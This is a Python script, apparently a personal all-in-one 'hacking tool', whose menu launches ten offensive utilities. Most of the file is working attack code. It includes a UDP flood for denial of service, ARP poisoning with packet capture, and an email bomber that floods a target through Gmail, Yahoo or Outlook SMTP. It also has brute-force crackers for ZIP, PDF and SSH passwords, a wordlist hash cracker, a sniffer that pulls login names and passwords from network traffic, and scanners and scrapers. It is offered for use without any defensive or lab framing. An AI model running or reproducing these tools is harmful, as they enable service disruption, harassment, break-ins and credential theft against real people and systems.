import os
import sys
import time
import socket
import random
import paramiko
import re, requests
import multiprocessing, netaddr, argparse, logging
from datetime import datetime
import subprocess
from urllib.request import Request, urlopen
from bs4 import BeautifulSoup
import requests.exceptions
import zipfile
from urllib.parse import urlsplit
from urllib.parse import urlparse
import requests.exceptions
from urllib.parse import urlsplit
from collections import deque
from bs4 import BeautifulSoup
from getmac import get_mac_address
from time import sleep
import smtplib
import subprocess
from urllib import parse
import hashlib, bcrypt
import pikepdf
from termcolor import colored
from colorama import *
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0


################################################################################################################

def DoSAttack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(1024)

    os.system("clear")
    print("Welcome to DoS attack")
    print("")
    ip = input("Target IP: ")
    port = int(input("Port : "))
    duration = input("Time: ")
    timeout = time.time() + float(duration)
    sent = 0

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("Sent %s packets to %s through port %s" % (sent, ip, port))
        except KeyboardInterrupt:
            sys.exit()


################################################################################################################


def WebScraper():
    class RegEx:
        def __init__(self, pattern, desc):
            self.pattern = pattern
            self.desc = desc

    rgxEmail = RegEx(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", "Emails")
    rgxPhone = RegEx(r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b", "Phone Numbers")
    rgxIP = RegEx(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", "IP Addresses")
    rgxWord = RegEx(r"[a-zA-Z]+", "Words")

    def scrapeURL(url, rgx):
        try:
            src = requests.get(url.strip())
            for rg in rgx:
                print("[*] Scraping" + rg.desc + " form " + url.strip())
                res = set(re.findall(rg.pattern, src.text, re.I))
                for dat in res:
                    print(dat)
        except Exception as err:
            print(str(err))

    def scrapeFile(fle, rgx):
        try:
            with open(fle) as fh:
                for url in fh:
                    scrapeURL(url, rgx)
        except Exception as err:
            print(str(err))

    def main(url, action):
        rgx = []
        isFile = True
        if url.lower().startswith("http"):
            isFile = False
        if action.lower() == "e":  # scrape emails
            rgx = [rgxEmail]
        elif action.lower() == "p":  # scrape phone #
            rgx = [rgxPhone]
        elif action.lower() == "w":  # scrape words
            rgx = [rgxWord]
        elif action.lower() == "i":  # scrape IP
            rgx = [rgxIP]
        elif action.lower() == "a":  # scrape everything
            rgx = [rgxEmail, rgxPhone, rgxWord, rgxIP]

        if isFile:
            scrapeFile(url, rgx)
        else:
            scrapeURL(url, rgx)

        print("================================================")

    print("WELCOME TO WEBSCRAPER - SCRAPE PHONENUMBERS,EMAIL ADRESSES, WORDS AND IP ADRESSES")

    url = input("ENTER WEBSITE URL : ")
    action = input("CHOOSE AN ACTION (a = all, p = phone, w = words, i = IP) : ")
    if (action != "a" and action != "p" and action != "w" and action != "i"):
        print("INVALID ACTION")
    else:
        main(url, action)


################################################################################################################


def HostDiscovery():
    class const:
        ARP = 0
        PING = 1
        TCP = 2
        ALL = 3

    def arpScan(subnet):
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2)
        for snd, rcv in ans:
            print(rcv.sprintf(r"[ARP] Online: %ARP.psrc% - %Ether.src%"))

    def ping(ip):
        reply = sr1(IP(dst=str(ip)) / ICMP(), timeout=3)
        if reply is not None:
            print("[PING] Online: " + str(ip))

    def tcp(ip):
        port = 53
        srcp = RandShort()
        pkt = sr1(IP(dst=str(ip)) / TCP(sport=srcp, dport=port, flags="S"), timeout=5)
        if pkt is not None:
            flag = pkt.getlayer(TCP).flags
            if flag == 0x12:  # syn,ack
                print("[TCP] Online:" + str(ip) + " - replied with syn,ack")
                send(IP(dst=str(ip)) / TCP(sport=srcp, dport=port, flags="R"))
            elif flag == 0x14:  # RST
                print("[TCP] Online: " + str(ip) + " - replied with rst,ack")

    def scan(subnet, typ):
        jobs = []
        for ip in subnet:
            if typ == const.PING:
                p = multiprocessing.Process(target=ping, args=(ip,))
                jobs.append(p)
                p.start()
            else:
                p = multiprocessing.Process(target=tcp, args=(ip,))
                jobs.append(p)
                p.start()

        for j in jobs:
            j.join()

    def main(subnet, argument):
        sbnt = netaddr.IPNetwork(subnet)
        start = datetime.now()
        print("==================================================")
        print("Scanning " + str(sbnt[0]) + " to " + str(sbnt[-1]))
        print("Started @ " + str(start))
        print("==================================================")

        if argument == const.ARP:
            arpScan(subnet)
        elif argument == const.PING:
            scan(sbnt, const.PING)
        elif argument == const.TCP:
            scan(sbnt, const.TCP)
        elif argument == const.ALL:
            arpScan(subnet)
            scan(sbnt, const.PING)
            scan(sbnt, const.TCP)
        else:
            print("INVALID ARGUMENT")

        stop = datetime.now()
        print("==================================================")
        print("Scan Duration: " + str(stop - start))
        print("Completed @ " + str(stop))
        print("==================================================")

    subnet = input("SUBNET TO SCAN : ")
    argument = int(input("CHOOSE AN OPTION (0 = Arp, 1 = Ping, 2 = TCP, 3 = ALL) : "))
    main(subnet, argument)

################################################################################################################

def BannerGrabber():

    def scan(ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            res = s.connect_ex((ip, port))
            if res == 0:
                if port == 80:
                    rsp = "HEAD / HTTP/1.1\r\nhost: " + ip + "\r\n\r\n"
                    s.send(rsp.encode())
                banner = s.recv(4096)
                msg = "[+] Port " + str(port) + " open\n"
                msg += "------------------------\n" + banner.strip().decode()
                print(msg + "\n------------------------\n")
            s.close()
        except socket.timeout:
            banner = "No Banner Message"
            if port == 53:
                banner = subprocess.getoutput("nslookup -type=any -class=chaos version.bind " + ip)
            msg = "[+] Port " + str(port) + " open\n"
            msg += "------------------------\n" + banner.strip().decode()
            print(msg + "\n------------------------\n")
            s.close()

    def main(ip,sport,eport):
        try:
            start = datetime.now()
            print("==================================================")
            print("Scanning " + ip + " Ports: " + str(sport) + " - " + str(eport))
            print("==================================================\n")
            ports = range(sport, eport + 1)
            for port in ports:
                p = multiprocessing.Process(target=scan, args=(ip, port,))
                p.start()
                time.sleep(1)
            time.sleep(3)
            stop = datetime.now()
            print("==================================================")
            print("Scan Duration: " + str(stop - start))
            print("==================================================")
        except Exception as err:
            print(str(err))

    ip = input("ip : ")
    sport = int(input("start port : "))
    eport = int(input("end port : "))
    main(ip,sport,eport)

################################################################################################################

def MITMTool():

    interface = "eth0"
    targetIP = "10.2.1.16"
    gateIP = "10.2.1.1"
    packets = 99999
    logfile = "log.pcap"
    bcast = "ff:ff:ff:ff:ff:ff"

    def ip2mac(ip):
        mac = get_mac_address(ip)
        return str(mac)

    def arpPoison(gateIp, gateMac, targetIp, targetMac):
        while True:
            try:
                print("[*] ARP poisoning [CTRL-C to stop]")
                send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=targetMac))
                send(ARP(op=2, psrc=targetIP, pdst=gateIp, hwdst=gateMac))
                time.sleep(2)
            except KeyboardInterrupt:
                pass

    def arpRestore(gateIp, gateMac, targetIp, targetMac):
        for x in range(5):
            print("[*] Restoring ARP table [" + str(x) + " of 4]")
            send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=bcast, hwsrc=gateMac), count=5)
            send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst=bcast, hwsrc=targetMac), count=5)
            time.sleep(2)

    #if __name__ == '__main__':
    conf.iface = interface
    conf.verb = 0
    gateMac = ip2mac(gateIP)
    targetMac = ip2mac(targetIP)
    print("[*] Interface: " + interface)
    print("[*] Gateway: " + gateIP + " [" + gateMac + "]")
    print("[*] Target: " + targetIP + " [" + targetMac + "]")
    print("[*] Enabling Packet Forwarding")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")

    p = multiprocessing.Process(target=arpPoison, args=(gateIP, gateMac, targetIP, targetMac,))
    p.start()

    print("[*] Sniffing Packets")
    packets = sniff(count=packets, filter=("ip host " + targetIP), iface=interface)
    wrpcap(logfile, packets)
    p.terminate()
    print("[*] Sniffing Complete")

    print("[*] Disable Packet Forwarding")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
    arpRestore(gateIP, gateMac, targetIP, targetMac)
    print("[*] Exiting")

################################################################################################################

def WebServerDirAndFileEnumerator():

    def request(url):
        try:
            agent = {
                "User-Agent": ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
            }
            rsp = requests.get(url)
            if rsp.status_code != 404:
                print("[+] Status " + str(rsp.status_code) + ": " + url)
        except Exception as err:
            print(str(err))

    def scan(url, word, ext):
        turl = "http://" + url + word.rstrip()
        request(turl)
        if ext:
            request(turl + ext)

    def main(URL,wordList,extension):
        start = datetime.now()
        print("==================================================")
        print("Started @ " + str(start))
        print("==================================================")
        if URL.endswith("/") == False: URL += "/"
        with open(wordList) as fle:
            for word in fle:
                if word.startswith("#") == False:
                    p = multiprocessing.Process(target=scan, args=(URL, word, extension))
                    p.start()
        stop = datetime.now()
        print("==================================================")
        print("Scan Duration: " + str(stop - start))
        print("Completed @ " + str(stop))
        print("==================================================")

    def FindURLPaths(URL):

        url = str(URL)
        new_urls = deque([url])
        processed_urls = set()
        local_urls = set()
        foreign_urls = set()
        broken_urls = set()

        while len(new_urls):
            url = new_urls.popleft()
            processed_urls.add(url)
            print("Processing %s" % url)
            try:
                response = requests.get(url)
            except (
            requests.exceptions.MissingSchema, requests.exceptions.ConnectionError, requests.exceptions.InvalidURL,
            requests.exceptions.InvalidSchema):
                broken_urls.add(url)
                continue

            parts = urlsplit(url)
            base = "{0.netloc}".format(parts)
            strip_base = base.replace("www.", "")
            base_url = "{0.scheme}://{0.netloc}".format(parts)
            path = url[:url.rfind('/') + 1] if '/' in parts.path else url
            soup = BeautifulSoup(response.text, "lxml")

            for link in soup.find_all('a'):
                anchor = link.attrs["href"] if "href" in link.attrs else ''

                if anchor.startswith('/'):
                    local_link = base_url + anchor
                    local_urls.add(local_link)
                elif strip_base in anchor:
                    local_urls.add(anchor)
                elif not anchor.startswith('http'):
                    local_link = path + anchor
                    local_urls.add(local_link)
                else:
                    foreign_urls.add(anchor)

                for i in local_urls:
                    if not i in new_urls and not i in processed_urls:
                        new_urls.append(i)

        print(processed_urls)

    print("CHOOSE AN OPTION : ")
    print("")
    print("1 - FIND SPECIFIC URL PATH BY WORDLIST FILE")
    print("2 - FIND PATHS FROM URL")
    opt = int(input(""))

    if(opt == 1):
        URL = input("URL : ")
        wordList = input("WORDLIST : ")
        extension = input("EXTENSION : ")
        main(URL,wordList,extension)
    elif(opt == 2):
        URL = input("URL : ")
        FindURLPaths(URL)
    else:
        print("INVAlID OPTION")

################################################################################################################

def EmailBomber():

    class bcolors:
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'

    class Email_Bomber:
        count = 0

        def __init__(self):
            try:
                print(bcolors.RED + '\nSTARTING EMAIL BOMBER...')
                self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
                self.mode = int(
                    input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERROR: Invalid Option. GoodBye.')
                    sys.exit(1)
            except Exception as e:
                print(f'ERROR: {e}')

        def bomb(self):
            try:
                print(bcolors.RED + '\nEMAIL BOMBER')
                self.amount = None
                if self.mode == int(1):
                    self.amount = int(1000)
                elif self.mode == int(2):
                    self.amount = int(500)
                elif self.mode == int(3):
                    self.amount = int(250)
                else:
                    self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
                print(
                    bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
            except Exception as e:
                print(f'ERROR: {e}')

        def email(self):
            try:
                print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
                self.server = str(input(
                    bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

                if default_port == True:
                    self.port = int(587)

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
                self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
                self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
                self.message = str(input(bcolors.GREEN + 'Enter message <: '))

                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print(f'ERROR: {e}')

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count += 1
                print(bcolors.YELLOW + f'BOMB: {self.count}')
            except Exception as e:
                print(f'ERROR: {e}')

        def attack(self):
            print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
            for email in range(self.amount + 1):
                self.send()
            self.s.close()
            print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
            sys.exit(0)

    if __name__ == '__main__':
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()

################################################################################################################

def BruteforcePasswordCracker():

    def ZIPCRACK(r):
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
        complete = []

        for current in range(r):
            a = [i for i in charlist]
            for x in range(current):
                a = [y + i for i in charlist for y in a]
            complete = complete + a
        z = zipfile.ZipFile('/home/arafa/secret.zip')
        tries = 0

        for passwd in complete:
            try:
                tries += 1
                z.setpassword(passwd.encode('ascii'))
                z.extractall()
                print(f'Password was found after {tries} tries ! The password is : {passwd}')
                break
            except:
                print("Trying...")
                pass

    def ZIPCRACKBYFILE():
        z = zipfile.ZipFile('/home/arafa/secret.zip')
        tries = 0
        LIST_OF_COMMON_PASSWORDS = str(urlopen(
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                       'utf-8')
        for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
            try:
                tries +=1
                z.setpassword(guess.encode('utf-8'))
                z.extractall()
                print(f'Password was found after {tries} tries ! The password is : {guess}')
                break
            except:
                print("Trying...")
                pass

    def PDFCRACK(r):
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
        complete = []

        for current in range(r):
            a = [i for i in charlist]
            for x in range(current):
                a = [y + i for i in charlist for y in a]
            complete = complete + a
        tries = 0

        for passwd in complete:
            try:
                tries += 1
                pikepdf.open("/home/arafa/Documenten/aa.pdf",passwd.strip())
                print(f'Password was found after {tries} tries ! The password is : {passwd}')
                break
            except:
                print("Trying...")
                pass

    def PDFCRACKBYFILE():
        tries = 0
        LIST_OF_COMMON_PASSWORDS = str(urlopen(
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                       'utf-8')
        for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
            try:
                tries +=1
                pikepdf.open("/home/arafa/Documenten/aa.pdf",guess.strip())
                print(f'Password was found after {tries} tries ! The password is : {guess}')
                break
            except:
                print("Trying...")
                pass

    def SSHCRACK(r):
        def ssh_connect(password,code=0):
            SSH = paramiko.SSHClient()
            SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                SSH.connect(host, port=22, username=username, password=password)
            except paramiko.AuthenticationException:
                code = 1
            except socket.error as e:
                code = 2

            SSH.close()
            return code

        host = input("TARGET IP : ")
        username = input("SSH USERNAME : ")
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
        complete = []

        for current in range(r):
            a = [i for i in charlist]
            for x in range(current):
                a = [y + i for i in charlist for y in a]
            complete = complete + a
        tries = 0

        for passwd in complete:
            try:
                tries += 1
                resp = ssh_connect(passwd)
                if resp == 0:
                    print("")
                    print("FOUND PASSWORD : ", passwd, "\nFOR ACCOUNT : ", username)
                    print("")
                    print(f'Password was found after {tries} tries ! The password is : {passwd}')
                    break
                elif resp == 1:
                    print("INCORRECT LOGIN : " + passwd)
                elif resp == 2:
                    print("CAN'T ESTABLISH CONNECTION")
                    sys.exit(1)
            except:
                print("Trying...")
                pass

    def SSHCRACKBYFILE():
        def ssh_connect(password,code=0):
            SSH = paramiko.SSHClient()
            SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                SSH.connect(host, port=22, username=username, password=password)
            except paramiko.AuthenticationException:
                code = 1
            except socket.error as e:
                code = 2

            SSH.close()
            return code

        host = input("TARGET IP : ")
        username = input("SSH USERNAME : ")
        file = input("PASSWORD FILE : ")

        def func():

            if os.path.exists(file) == False:
                print("No such file in specified path !")
                sys.exit(1)

            with open(file,"r") as f:
                for line in f.readlines():
                    password = line.strip()
                    try:
                        resp = ssh_connect(password)

                        if resp == 0:
                            print("")
                            print("FOUND PASSWORD : " , password, "\nFOR ACCOUNT : " , username)
                            break
                        elif resp == 1:
                            print("INCORRECT LOGIN : " + password)
                        elif resp == 2:
                            print("CAN'T ESTABLISH CONNECTION")
                            sys.exit(1)
                    except Exception as e:
                        print(e)
                        pass

        func()


    opt = int(input("CHOOSE AN OPTION \n1 - ZIP PASSWORD CRACK \n2 - PDF PASSWORD CRACK \n3 - SSH PASSWORD CRACK \n"))
    if(opt == 1):
        choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
        if(choose == 1):
            r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
            ZIPCRACK(r)
        elif(choose == 2):
            ZIPCRACKBYFILE()
        else:
            print("INVALID OPTION")
    elif(opt ==2):
        choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
        if (choose == 1):
            r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
            PDFCRACK(r)
        elif (choose == 2):
            PDFCRACKBYFILE()
        else:
            print("INVALID OPTION")
    elif(opt == 3):
        choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
        if (choose == 1):
            r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
            SSHCRACK(r)
        elif (choose == 2):
            SSHCRACKBYFILE()
        else:
            print("INVALID OPTION")
    else:
        print("INVALID OPTION")

def PasswordEncodeDecode():
    def SHA1(password):
        print("")
        print("SHA1 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha1(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def MD5(password):
        print("")
        print("MD5 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.md5(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA256(password):
        print("")
        print("SHA256 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha256(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA512(password):
        print("")
        print("SHA512 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha512(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA224(password):
        print("")
        print("SHA224 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha224(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)
    def SHA384(password):
        print("")
        print("SHA384 ENCODER")
        setpass = bytes(password, 'utf-8')
        hash_obj = hashlib.sha384(setpass)
        encoded = hash_obj.hexdigest()
        print(encoded)


    def PasswordEncoder():
        option = int(input("CHOOSE HASHING OPTION \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n7 - ALL \n"))
        password = input("INPUT PASSWORD TO HASH : ")
        if(option ==1):
            SHA1(password)
        elif(option == 2):
            MD5(password)
        elif(option == 3):
            SHA256(password)
        elif(option == 4):
            SHA512(password)
        elif(option == 5):
            SHA224(password)
        elif(option == 6):
            SHA384(password)
        elif(option == 7):
            SHA1(password)
            SHA224(password)
            SHA256(password)
            SHA512(password)
            SHA384(password)
            MD5(password)
        else:
            print("INVALID INPUT")

    def PasswordDecoder():
        def SHA1(password):
            print("")
            print("SHA1 DECODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("The password is ", str(guess))
                    quit()
                elif hashedGuess != password:
                    print("Password guess ", str(guess)," does not match, trying next...")
            print("")
            print("Password not in collection or wrong hash option")

        def MD5(password):
            print("")
            print("MD5 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.md5(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("The password is ", str(guess))
                    quit()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("Password not in collection or wrong hash option")

        def SHA256(password):
            print("")
            print("SHA256 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha256(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("The password is ", str(guess))
                    quit()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("Password not in collection or wrong hash option")

        def SHA512(password):
            print("")
            print("SHA512 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha512(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("The password is ", str(guess))
                    quit()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("Password not in collection or wrong hash option")

        def SHA224(password):
            print("")
            print("SHA224 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha224(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("The password is ", str(guess))
                    quit()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("Password not in collection or wrong hash option")

        def SHA384(password):
            print("")
            print("SHA384 ENCODER")
            LIST_OF_COMMON_PASSWORDS = str(urlopen(
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                           'utf-8')
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                hashedGuess = hashlib.sha384(bytes(guess, 'utf-8')).hexdigest()
                if hashedGuess == password:
                    print("The password is ", str(guess))
                    quit()
                elif hashedGuess != password:
                    print("Password guess ", str(guess), " does not match, trying next...")
            print("")
            print("Password not in collection or wrong hash option")

        option = int(input("CHOOSE DECODING OPTION \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n"))
        password = input("INPUT HASH TO CRACK : ")
        if (option == 1):
            SHA1(password)
        elif (option == 2):
            MD5(password)
        elif (option == 3):
            SHA256(password)
        elif (option == 4):
            SHA512(password)
        elif (option == 5):
            SHA224(password)
        elif (option == 6):
            SHA384(password)
        else:
            print("INVALID INPUT")
    print("WELCOME TO PASSWORD ENCODER/DECODER")
    print("")
    opt = int(input("CHOOSE AN OPTION (1 - ENCODE, 2 - DECODE) : "))
    if(opt == 1):
        PasswordEncoder()
    elif(opt == 2):
        PasswordDecoder()
    else:
        print("INVALID OPTION")

################################################################################################################

def PasswordSnif():

    iface = "eth0"

    def get_login_pass(body):
        user = None
        passwd = None
        userfields = ['log','login','wpname','ahd_username','Username','unickname','nickname','alias','psuedo','email','username','_username','userid','pop_login'
                      'login_id','uname','ulogin','acctname','login_email','account','member','uin','sign-in','session_key']
        passfields = ['ahd_password','pass','password','_password','Password','passwd','userpassword','login_password','passwort','passwrd','wppassword','upasswd','senha']

        for login in userfields:
            login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
            if login_re:
                user = login_re.group()
        for passfield in passfields:
            pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
            if pass_re:
                passwd = pass_re.group()

        if user and passwd:
            return(user,passwd)

    def pkt_parser(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            body = str(packet[TCP].payload)
            user_pass = get_login_pass(body)
            if user_pass != None:
                print(packet[TCP].payload)
                print(parse.unquote(user_pass[0]))
                print(parse.unquote(user_pass[1]))
            else:
                pass

    try:
        print("SNIFFING...")
        sniff(iface=iface, prn=pkt_parser,store=0)
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)

################################################################################################################

print("WELCOME TO ARAFA'S HACKING TOOL")
print("")
print("1 - DoS ATTACK")
print("2 - WEB SCRAPER")
print("3 - 3-WAY HOST DISCOVERY")
print("4 - BANNER GRABBER")
print("5 - MITM TOOL")
print("6 - WEB SERVER DIRECTORY AND FILE ENUMERATOR")
print("7 - EMAIL BOMBER")
print("8 - BRUTEFORCE PASSWORD CRACKER")
print("9 - PASSWORD ENCODER/DECODER")
print("10 - PASSWORD SNIFFER")
print("")

option = int(input("CHOOSE AN OPTION BETWEEN 1-10 TO EXECUTE PROGRAM (SELECT 0 TO EXIT)\n"))

if (option == 0):
    print("Goodbye...")
    sys.exit()
elif (option == 1):
    DoSAttack()
elif (option == 2):
    WebScraper()
elif (option == 3):
    HostDiscovery()
elif (option == 4):
    BannerGrabber()
elif (option == 5):
    MITMTool()
elif (option == 6):
    WebServerDirAndFileEnumerator()
elif (option == 7):
    EmailBomber()
elif (option == 8):
    BruteforcePasswordCracker()
elif (option == 9):
    PasswordEncodeDecode()
elif(option == 10):
    PasswordSnif()
else:
    print("INVALID INPUT")
